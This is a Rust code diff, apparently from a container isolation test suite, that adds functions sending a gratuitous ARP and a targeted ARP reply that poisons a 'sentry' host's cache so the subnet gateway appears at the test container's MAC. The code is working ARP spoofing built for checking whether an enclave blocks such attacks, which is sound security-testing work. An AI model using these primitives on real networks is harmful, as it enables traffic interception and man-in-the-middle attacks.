@@ -1517,7 +1517,7 @@ fn build_arp_reply(
 }
 
 /// Test if AF_PACKET socket can be opened. Returns Ok(true) if yes.
-fn arp_test_af_packet(iface: &str) -> Result<bool, String> {
+fn arp_test_af_packet(_iface: &str) -> Result<bool, String> {
     #[cfg(target_os = "linux")]
     {
         unsafe {
@@ -1721,4 +1721,99 @@ pub fn sortie_ns_capability_escape(_extra_args: &[&str]) -> rbida_Verdict {
     }
 
     pass("SECURE: container isolation intact — no namespace or capability escape".to_string())
+}
+
+// ── Coordinated attack primitives ─────────────────────────────
+//
+// These execute a single ARP action and report whether the action
+// was carried out.  The security verdict is NOT determined here —
+// the theurge snapshots the sentry's ARP table before and after
+// and judges the outcome from the outside.
+//
+// Verdict semantics for coordinated primitives:
+//   passed=true  → "I executed the attack" (frames were sent)
+//   passed=false → "I could not execute" (AF_PACKET blocked, etc.)
+
+pub fn sortie_arp_send_gratuitous(_extra_args: &[&str]) -> rbida_Verdict {
+    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
+        Ok(v) => v,
+        Err(e) => return fail(format!("ERROR: {}", e)),
+    };
+
+    let (iface, our_mac) = match get_interface_info() {
+        Some((i, m)) => (i, m),
+        None => return fail("ERROR: cannot discover enclave interface".to_string()),
+    };
+
+    if arp_test_af_packet(&iface).is_err() {
+        return fail("AF_PACKET unavailable — cannot send L2 frames".to_string());
+    }
+
+    let our_mac_bytes = match mac_to_bytes(&our_mac) {
+        Ok(b) => b,
+        Err(e) => return fail(format!("ERROR: {}", e)),
+    };
+
+    let frame = build_gratuitous_arp(&our_mac_bytes, &sentry_ip);
+    if send_raw_frame(&iface, &frame) {
+        pass(format!(
+            "SENT gratuitous ARP claiming {} at {} on {}",
+            sentry_ip, our_mac, iface
+        ))
+    } else {
+        fail("AF_PACKET open but frame send failed".to_string())
+    }
+}
+
+pub fn sortie_arp_send_gateway_poison(_extra_args: &[&str]) -> rbida_Verdict {
+    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
+        Ok(v) => v,
+        Err(e) => return fail(format!("ERROR: {}", e)),
+    };
+
+    let (iface, our_mac) = match get_interface_info() {
+        Some((i, m)) => (i, m),
+        None => return fail("ERROR: cannot discover enclave interface".to_string()),
+    };
+
+    if arp_test_af_packet(&iface).is_err() {
+        return fail("AF_PACKET unavailable — cannot send L2 frames".to_string());
+    }
+
+    let our_mac_bytes = match mac_to_bytes(&our_mac) {
+        Ok(b) => b,
+        Err(e) => return fail(format!("ERROR: {}", e)),
+    };
+
+    // Discover sentry MAC so we can send targeted ARP reply
+    let sentry_mac = match get_sentry_mac(&sentry_ip) {
+        Some(m) => m,
+        None => return fail("cannot discover sentry MAC from ARP cache".to_string()),
+    };
+    let sentry_mac_bytes = match mac_to_bytes(&sentry_mac) {
+        Ok(b) => b,
+        Err(e) => return fail(format!("ERROR: sentry MAC parse: {}", e)),
+    };
+
+    // Compute gateway IP as .1 on the sentry's subnet
+    let prefix: String = sentry_ip
+        .rsplit('.')
+        .skip(1)
+        .collect::<Vec<_>>()
+        .into_iter()
+        .rev()
+        .collect::<Vec<_>>()
+        .join(".");
+    let fake_gw = format!("{}.1", prefix);
+
+    // Send targeted ARP reply: tell sentry that gateway is at our MAC
+    let frame = build_arp_reply(&our_mac_bytes, &fake_gw, &sentry_mac_bytes, &sentry_ip);
+    if send_raw_frame(&iface, &frame) {
+        pass(format!(
+            "SENT ARP reply to sentry ({}) claiming {} at {}",
+            sentry_ip, fake_gw, our_mac
+        ))
+    } else {
+        fail("AF_PACKET open but targeted ARP frame send failed".to_string())
+    }
 }
